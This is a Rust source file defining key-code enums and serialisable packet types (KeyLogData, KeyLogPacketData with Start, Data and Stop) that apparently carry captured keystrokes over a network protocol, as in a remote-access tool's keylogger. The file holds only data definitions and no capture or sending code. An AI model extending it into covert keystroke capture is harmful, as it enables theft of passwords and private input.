use crate::network::packet::AnyPacketData;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum KeyCode {
    // Alphanumeric
    A, B, C, D, E, F, G, H, I, J, K, L, M,
    N, O, P, Q, R, S, T, U, V, W, X, Y, Z,
    Num0, Num1, Num2, Num3, Num4,
    Num5, Num6, Num7, Num8, Num9,

    // Function keys
    F1, F2, F3, F4, F5, F6,
    F7, F8, F9, F10, F11, F12,

    // Modifier keys
    Shift,
    Ctrl,
    Alt,
    Meta, // Command on macOS, Windows key on Win

    // Navigation
    Up,
    Down,
    Left,
    Right,
    Home,
    End,
    PageUp,
    PageDown,

    // Other keys
    Enter,
    Escape,
    Backspace,
    Tab,
    Space,
    Insert,
    Delete,

    // Symbols
    Minus,
    Equal,
    LeftBracket,
    RightBracket,
    Backslash,
    Semicolon,
    Quote,
    Comma,
    Period,
    Slash,
    Grave,

    // Numpad (optional)
    Numpad0,
    Numpad1,
    Numpad2,
    Numpad3,
    Numpad4,
    Numpad5,
    Numpad6,
    Numpad7,
    Numpad8,
    Numpad9,
    NumpadAdd,
    NumpadSub,
    NumpadMul,
    NumpadDiv,
    NumpadEnter,

    // Unknown or unmapped
    Unknown(u32),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum KeyState {
    Pressed,
    Released,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyEntry {
    pub code: KeyCode,
    pub state: KeyState,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyLogData{
    keys: Vec<KeyEntry>,
    display: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum KeyLogPacketData {
    Start,
    Data(KeyLogData),
    Stop,
}

#[typetag::serde]
impl AnyPacketData for KeyLogPacketData {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
}
